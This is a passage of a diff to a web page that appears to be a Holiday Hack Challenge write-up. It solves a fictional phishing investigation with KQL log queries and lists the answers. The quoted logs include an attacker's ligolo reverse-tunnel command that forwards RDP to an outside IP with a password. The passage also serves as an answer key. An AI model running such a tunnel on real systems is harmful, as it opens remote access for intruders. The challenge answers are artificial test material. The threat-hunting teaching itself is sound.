@@ -18,7 +18,7 @@
       
       
       <link rel="icon" href="../../img/misc/favicon.ico">
-      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.3">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.2">
     
     
       
@@ -1247,7 +1247,7 @@
         
   
   <span class="md-ellipsis">
-    easter_eggs
+    Easter Eggs
   </span>
   
 
@@ -1319,227 +1319,540 @@
 <p>Looking for a file that was created on a victim system? Don't forget the FileCreationEvents table.</p>
 </details>
 <h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
+<p>Kraken hunt, right? <a href="https://en.wikipedia.org/wiki/Kraken">Kraken</a> is a legendary sea monster. </p>
+<p>Kusto Query Language, or KQL, is a read-only request language used to write queries for Azure Data Explorer (ADX), Azure Monitor Log Analytics, Azure Sentinel, and more. The request is stated in plain text, using a data-flow model that is easy to read, author, and automate.</p>
+<p><img alt="KQL" src="../../img/objectives/o11/kql.png" /></p>
 <p>Your need to play this game at: </p>
 <p>https://detective.kusto.io/sans2023</p>
-<h4 id="case-0">Case 0:<a class="headerlink" href="#case-0" title="Permanent link">⚓︎</a></h4>
-<div class="highlight"><pre><span></span><code>| where role has &quot;Craftsperson Elf&quot;
-| where hostname has &quot;LAPTOP&quot;
-| count 
-</code></pre></div>
+<h3 id="case-0">Case 0:<a class="headerlink" href="#case-0" title="Permanent link">⚓︎</a></h3>
+<div class="admonition question">
+<p class="admonition-title">Question 0</p>
+<p>How many Craftperson Elf's are working from laptops?</p>
+</div>
+<details class="success">
+<summary>Answer</summary>
+<p>25 </p>
+</details>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">KQL commands</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">Employees</span>
+<span class="hll"><span class="p">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">role</span><span class="w"> </span><span class="k">has</span><span class="w"> </span><span class="s">&quot;Craftsperson Elf&quot;</span>
+</span><span class="p">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">hostname</span><span class="w"> </span><span class="k">has</span><span class="w"> </span><span class="s">&quot;LAPTOP&quot;</span>
+<span class="p">|</span><span class="w"> </span><span class="k">count</span><span class="w"> </span>
+</code></pre></div></td></tr></table></div>
 <h4 id="case-1">Case 1:<a class="headerlink" href="#case-1" title="Permanent link">⚓︎</a></h4>
+<details class="quote">
+<summary>Lieutenant Hackstopper</summary>
+<p>An urgent alert has just come in, 'A user clicked through to a potentially malicious URL involving one user.' This message hints at a possible security incident, leaving us with critical questions about the user's intentions, the nature of the threat, and the potential risks to Santa's operations. Your mission is to lead our security operations team, investigate the incident, uncover the motives behind email, assess the potential threats, and safeguard the operations from the looming cyber threat.</p>
+<p>The clock is ticking, and the stakes are high - are you up for this exhilarating challenge? Your skills will be put to the test, and the future of Geese Island's digital security hangs in the balance. Good luck!</p>
+<p>The alert says the user clicked the malicious link 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'</p>
+</details>
 <h3 id="question-1">Question 1<a class="headerlink" href="#question-1" title="Permanent link">⚓︎</a></h3>
 <div class="admonition question">
 <p class="admonition-title">Question</p>
+<ol>
+<li>
 <p>What is the email address of the employee who received this phishing email?</p>
-<p>alabaster_snowball@santaworkshopgeeseislands.org</p>
+</li>
+<li>
 <p>What is the email address that was used to send this spear phishing email?</p>
-<p>cwombley@gmail.com</p>
+</li>
+<li>
 <p>What was the subject line used in the spear phishing email?</p>
-<p>[EXTERNAL] Invoice foir reindeer food past due</p>
+</li>
+</ol>
 </div>
-<div class="highlight"><pre><span></span><code>Timestamp: 
-2023-12-02T09:37:40Z
+<details class="success">
+<summary>Answer</summary>
+<ol>
+<li>alabaster_snowball@santaworkshopgeeseislands.org</li>
+<li>cwombley@gmail.com</li>
+<li>[EXTERNAL] Invoice foir reindeer food past due</li>
+</ol>
+</details>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">KQL commands</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">Email</span>
+<span class="hll"><span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">link</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="ss">&quot;http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx&quot;</span>
+</span>
+<span class="k">Timestamp</span><span class="p">:</span><span class="w"> </span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">02</span><span class="n">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">40</span><span class="n">Z</span>
 
-alabaster_snowball@santaworkshopgeeseislands.org
+<span class="hll"><span class="n">alabaster_snowball</span><span class="o">@</span><span class="n">santaworkshopgeeseislands</span><span class="p">.</span><span class="n">org</span>
+</span>
+<span class="hll"><span class="n">cwombley</span><span class="o">@</span><span class="n">gmail</span><span class="p">.</span><span class="n">com</span>
+</span>
+<span class="hll"><span class="p">[</span><span class="k">EXTERNAL</span><span class="p">]</span><span class="w"> </span><span class="n">Invoice</span><span class="w"> </span><span class="n">foir</span><span class="w"> </span><span class="n">reindeer</span><span class="w"> </span><span class="n">food</span><span class="w"> </span><span class="n">past</span><span class="w"> </span><span class="n">due</span>
+</span>
+<span class="n">Hire_date</span><span class="p">:</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">09</span><span class="n">T06</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">43</span><span class="n">Z</span>
 
-cwombley@gmail.com
+<span class="n">User_agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="mi">6</span><span class="p">.</span><span class="mi">2</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">;</span><span class="w"> </span><span class="n">Trident</span><span class="o">/</span><span class="mi">7</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="mi">11</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="n">Gecko</span>
 
-[EXTERNAL] Invoice foir reindeer food past due
+<span class="n">Company_domain</span><span class="p">:</span><span class="w"> </span><span class="n">santaworkshopgeeseislands</span><span class="p">.</span><span class="n">org</span>
 
-Hire_date: 2021-06-09T06:59:43Z
+<span class="n">Username</span><span class="p">:</span><span class="w"> </span><span class="n">alsnowball</span>
 
-User_agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko
+<span class="k">role</span><span class="p">:</span><span class="w"> </span><span class="n">Head</span><span class="w"> </span><span class="n">Elf</span>
 
-Company_domain: santaworkshopgeeseislands.org
+<span class="n">hostname</span><span class="p">:</span><span class="w"> </span><span class="n">Y1US</span><span class="o">-</span><span class="n">DESKTOP</span>
 
-Username: alsnowball
-
-role: Head Elf
-
-hostname: Y1US-DESKTOP
-
-Ip_addr = 10.10.0.4
-</code></pre></div>
-<h4 id="case-2">Case 2:<a class="headerlink" href="#case-2" title="Permanent link">⚓︎</a></h4>
+<span class="n">Ip_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">4</span>
+</code></pre></div></td></tr></table></div>
+<h3 id="case-2">Case 2:<a class="headerlink" href="#case-2" title="Permanent link">⚓︎</a></h3>
+<details class="quote">
+<summary>Lieutenant Hackstopper</summary>
+<p>Nicely done! You found evidence of the spear phishing email targeting someone in our organization. Now, we need to learn more about who the victim is!</p>
+<p>If the victim is someone important, our organization could be doomed! Hurry up, let's find out more about who was impacted!</p>
+</details>
 <h3 id="question-2">Question 2<a class="headerlink" href="#question-2" title="Permanent link">⚓︎</a></h3>
 <div class="admonition question">
 <p class="admonition-title">Question</p>
+<ol>
+<li>
 <p>What is the role of our victim in the organization?</p>
-<p>Head Elf</p>
+</li>
+<li>
 <p>What is the hostname of the victim's machine?</p>
-<p>Y1US-DESKTOP</p>
+</li>
+<li>
 <p>What is the source IP linked to the victim?</p>
-<p>10.10.0.4</p>
+</li>
+</ol>
 </div>
+<details class="success">
+<summary>Answer</summary>
+<ol>
+<li>Head Elf</li>
+<li>Y1US-DESKTOP</li>
+<li>10.10.0.4</li>
+</ol>
+</details>
 <h4 id="case-3">Case 3:<a class="headerlink" href="#case-3" title="Permanent link">⚓︎</a></h4>
+<details class="quote">
+<summary>Lieutenant Hackstopper</summary>
+<p>The victim is Alabaster Snowball? Oh no... that's not good at all! Can you try to find what else the attackers might have done after they sent Alabaster the phishing email?</p>
+<p>Use our various security log datasources to uncover more details about what happened to Alabaster.</p>
+</details>
 <h3 id="question-3">Question 3<a class="headerlink" href="#question-3" title="Permanent link">⚓︎</a></h3>
 <div class="admonition question">
 <p class="admonition-title">Question</p>
+<ol>
+<li>
 <p>What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs!</p>
-<p>2023-12-02T10:12:42Z</p>
+</li>
+<li>
 <p>What file is dropped to Alabaster's machine shortly after he downloads the malicious file?</p>
-<p>giftwrap.exe</p>
+</li>
+</ol>
 </div>
-<div class="highlight"><pre><span></span><code>SecurityAlerts
-| project indicators
-</code></pre></div>
-<div class="highlight"><pre><span></span><code>OutboundNetworkEvents
-| where src_ip == &quot;10.10.0.4&quot;
-| where url has &quot;.docx&quot;
+<details class="success">
+<summary>Answer</summary>
+<ol>
+<li>
+<p>2023-12-02T10:12:42Z</p>
+</li>
+<li>
+<p>giftwrap.exe</p>
+</li>
+</ol>
+</details>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">KQL commands</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">SecurityAlerts</span>
+<span class="hll"><span class="o">|</span><span class="w"> </span><span class="n">project</span><span class="w"> </span><span class="n">indicators</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">KQL commands</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">OutboundNetworkEvents</span>
+<span class="hll"><span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">src_ip</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="ss">&quot;10.10.0.4&quot;</span>
+</span><span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="ss">&quot;.docx&quot;</span>
 
 
-&quot;timestamp&quot;: 2023-12-02T10:12:42Z,
-&quot;method&quot;: GET,
-&quot;src_ip&quot;: 10.10.0.4,
-&quot;user_agent&quot;: Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko,
-&quot;url&quot;: http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx
+<span class="ss">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">02</span><span class="n">T10</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">42</span><span class="n">Z</span><span class="p">,</span>
+<span class="hll"><span class="ss">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="k">GET</span><span class="p">,</span>
+</span><span class="ss">&quot;src_ip&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">4</span><span class="p">,</span>
+<span class="hll"><span class="ss">&quot;user_agent&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="mi">6</span><span class="p">.</span><span class="mi">2</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">;</span><span class="w"> </span><span class="n">Trident</span><span class="o">/</span><span class="mi">7</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="mi">11</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">,</span>
+</span><span class="ss">&quot;url&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">madelvesnorthpole</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">published</span><span class="o">/</span><span class="k">search</span><span class="o">/</span><span class="n">MonthlyInvoiceForReindeerFood</span><span class="p">.</span><span class="n">docx</span>
+<span class="hll">
+</span>
+<span class="n">FileCreationEvents</span>
+<span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">hostname</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="ss">&quot;Y1US-DESKTOP&quot;</span>
+<span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="ss">&quot;.docx&quot;</span>
 
 
-FileCreationEvents
-| where hostname has &quot;Y1US-DESKTOP&quot;
-| where path has &quot;.docx&quot;
+<span class="ss">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">02</span><span class="n">T10</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">35</span><span class="n">Z</span><span class="p">,</span>
+<span class="ss">&quot;hostname&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">Y1US</span><span class="o">-</span><span class="n">DESKTOP</span><span class="p">,</span>
+<span class="ss">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">alsnowball</span><span class="p">,</span>
+<span class="ss">&quot;sha256&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">9</span><span class="n">cec01b76ec24175cde5482b4c0b09fa4278b8e06a267186888853207adc3ced</span><span class="p">,</span>
+<span class="ss">&quot;path&quot;</span><span class="p">:</span><span class="w"> </span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">alsnowball</span><span class="err">\</span><span class="n">Downloads</span><span class="err">\</span><span class="n">MonthlyInvoiceForReindeerFood</span><span class="p">.</span><span class="n">docx</span><span class="p">,</span>
+<span class="ss">&quot;filename&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">MonthlyInvoiceForReindeerFood</span><span class="p">.</span><span class="n">docx</span><span class="p">,</span>
+<span class="ss">&quot;process_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">Edge</span><span class="p">.</span><span class="n">exe</span>
 
 
-&quot;timestamp&quot;: 2023-12-02T10:13:35Z,
-&quot;hostname&quot;: Y1US-DESKTOP,
-&quot;username&quot;: alsnowball,
-&quot;sha256&quot;: 9cec01b76ec24175cde5482b4c0b09fa4278b8e06a267186888853207adc3ced,
-&quot;path&quot;: C:\Users\alsnowball\Downloads\MonthlyInvoiceForReindeerFood.docx,
-&quot;filename&quot;: MonthlyInvoiceForReindeerFood.docx,
-&quot;process_name&quot;: Edge.exe
+<span class="n">FileCreationEvents</span>
+<span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">hostname</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="ss">&quot;Y1US-DESKTOP&quot;</span>
+<span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">timestamp</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">datetime</span><span class="p">(</span><span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">02</span><span class="n">T10</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">42</span><span class="n">Z</span><span class="p">)</span>
 
 
-FileCreationEvents
-| where hostname has &quot;Y1US-DESKTOP&quot;
-| where timestamp &gt; datetime(2023-12-02T10:12:42Z)
-
-
-&quot;timestamp&quot;: 2023-12-02T10:14:21Z,
-&quot;hostname&quot;: Y1US-DESKTOP,
-&quot;username&quot;: alsnowball,
-&quot;sha256&quot;: 4c199019661ef7ef79023e2c960617ec9a2f275ad578b1b1a027adb201c165f3,
-&quot;path&quot;: C:\ProgramData\Windows\Jolly\giftwrap.exe,
-&quot;filename&quot;: giftwrap.exe,
-&quot;process_name&quot;: explorer.exe
-</code></pre></div>
+<span class="ss">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">02</span><span class="n">T10</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">21</span><span class="n">Z</span><span class="p">,</span>
+<span class="ss">&quot;hostname&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">Y1US</span><span class="o">-</span><span class="n">DESKTOP</span><span class="p">,</span>
+<span class="ss">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">alsnowball</span><span class="p">,</span>
+<span class="ss">&quot;sha256&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="n">c199019661ef7ef79023e2c960617ec9a2f275ad578b1b1a027adb201c165f3</span><span class="p">,</span>
+<span class="ss">&quot;path&quot;</span><span class="p">:</span><span class="w"> </span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">ProgramData</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">Jolly</span><span class="err">\</span><span class="n">giftwrap</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span>
+<span class="ss">&quot;filename&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">giftwrap</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span>
+<span class="ss">&quot;process_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">explorer</span><span class="p">.</span><span class="n">exe</span>
+</code></pre></div></td></tr></table></div>
 <h4 id="case-4">Case 4:<a class="headerlink" href="#case-4" title="Permanent link">⚓︎</a></h4>
+<details class="quote">
+<summary>Lieutenant Hackstopper</summary>
+<p>Well, that's not good. It looks like Alabaster clicked on the link and downloaded a suspicious file. I don't know exactly what giftwrap.exe does, but it seems bad.</p>
+<p>Can you take a closer look at endpoint data from Alabaster's machine? We need to figure out exactly what happened here. Word of this hack is starting to spread to the other elves, so work quickly and quietly!</p>
+</details>
 <h3 id="question-4">Question 4<a class="headerlink" href="#question-4" title="Permanent link">⚓︎</a></h3>
 <div class="admonition question">
 <p class="admonition-title">Question</p>
+<ol>
+<li>
 <p>The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?</p>
-<p>113.37.9.17</p>
+</li>
+<li>
 <p>What is the timestamp when the attackers enumerated network shares on the machine?</p>
-<p>2023-12-02T16:51:44Z</p>
+</li>
+<li>
 <p>What was the hostname of the system the attacker moved laterally to?</p>
-<p>NorthPolefileshare</p>
+</li>
+</ol>
 </div>
-<div class="highlight"><pre><span></span><code>ProcessEvents
-| where hostname == &quot;Y1US-DESKTOP&quot; and process_commandline contains &quot;forward&quot;
+<details class="success">
+<summary>Answer</summary>
+<ol>
+<li>
+<p>113.37.9.17</p>
+</li>
+<li>
+<p>2023-12-02T16:51:44Z</p>
+</li>
+<li>
+<p>NorthPolefileshare</p>
+</li>
+</ol>
+</details>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">KQL commands</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span>
+<span class="normal">60</span>
+<span class="normal">61</span>
+<span class="normal">62</span>
+<span class="normal">63</span>
+<span class="normal">64</span>
+<span class="normal">65</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">ProcessEvents</span>
+<span class="hll"><span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">hostname</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="ss">&quot;Y1US-DESKTOP&quot;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">process_commandline</span><span class="w"> </span><span class="k">contains</span><span class="w"> </span><span class="ss">&quot;forward&quot;</span>
+</span>
+<span class="ss">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">02</span><span class="n">T11</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">29</span><span class="n">Z</span><span class="p">,</span>
+<span class="ss">&quot;parent_process_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span>
+<span class="ss">&quot;parent_process_hash&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">614</span><span class="n">ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</span><span class="p">,</span>
+<span class="hll"><span class="ss">&quot;process_commandline&quot;</span><span class="p">:</span><span class="w"> </span><span class="ss">&quot;ligolo&quot;</span><span class="w"> </span><span class="c1">--bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof,</span>
+</span><span class="ss">&quot;process_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">ligolo</span><span class="p">,</span>
+<span class="hll"><span class="ss">&quot;process_hash&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">e9b34c42e29a349620a1490574b87865cc1571f65aa376b928701a034e6b3533</span><span class="p">,</span>
+</span><span class="ss">&quot;hostname&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">Y1US</span><span class="o">-</span><span class="n">DESKTOP</span><span class="p">,</span>
+<span class="hll"><span class="ss">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">alsnowball</span>
+</span>
 
-&quot;timestamp&quot;: 2023-12-02T11:11:29Z,
-&quot;parent_process_name&quot;: cmd.exe,
-&quot;parent_process_hash&quot;: 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
-&quot;process_commandline&quot;: &quot;ligolo&quot; --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof,
-&quot;process_name&quot;: ligolo,
-&quot;process_hash&quot;: e9b34c42e29a349620a1490574b87865cc1571f65aa376b928701a034e6b3533,
-&quot;hostname&quot;: Y1US-DESKTOP,
-&quot;username&quot;: alsnowball
+<span class="n">ProcessEvents</span>
+<span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">hostname</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="ss">&quot;Y1US-DESKTOP&quot;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">process_commandline</span><span class="w"> </span><span class="o">==</span><span class="ss">&quot;net share&quot;</span>
 
-ProcessEvents
-| where hostname == &quot;Y1US-DESKTOP&quot; and process_commandline ==&quot;net share&quot;
-
-&quot;timestamp&quot;: 2023-12-02T16:51:44Z,
-&quot;parent_process_name&quot;: cmd.exe,
-&quot;parent_process_hash&quot;: 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
-&quot;process_commandline&quot;: net share,
-&quot;process_name&quot;: net.exe,
-&quot;process_hash&quot;: 8b5b1556ba468035a37b40d8ea42a4bff252f4502b97c52fcacb3ba269527a57,
-&quot;hostname&quot;: Y1US-DESKTOP,
-&quot;username&quot;: alsnowball
+<span class="ss">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">02</span><span class="n">T16</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">44</span><span class="n">Z</span><span class="p">,</span>
+<span class="ss">&quot;parent_process_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span>
+<span class="ss">&quot;parent_process_hash&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">614</span><span class="n">ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</span><span class="p">,</span>
+<span class="ss">&quot;process_commandline&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="k">share</span><span class="p">,</span>
+<span class="ss">&quot;process_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">net</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span>
+<span class="ss">&quot;process_hash&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">8</span><span class="n">b5b1556ba468035a37b40d8ea42a4bff252f4502b97c52fcacb3ba269527a57</span><span class="p">,</span>
+<span class="ss">&quot;hostname&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">Y1US</span><span class="o">-</span><span class="n">DESKTOP</span><span class="p">,</span>
+<span class="ss">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">alsnowball</span>
 
 
-InboundNetworkEvents
-| where src_ip has &quot;113.37.9.17&quot;
+<span class="n">InboundNetworkEvents</span>
+<span class="o">|</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">src_ip</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="ss">&quot;113.37.9.17&quot;</span>
 
-&quot;timestamp&quot;: 2023-12-02T11:29:55Z,
-&quot;method&quot;: GET,
-&quot;src_ip&quot;: 113.37.9.17,
-&quot;user_agent&quot;: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/5.1),
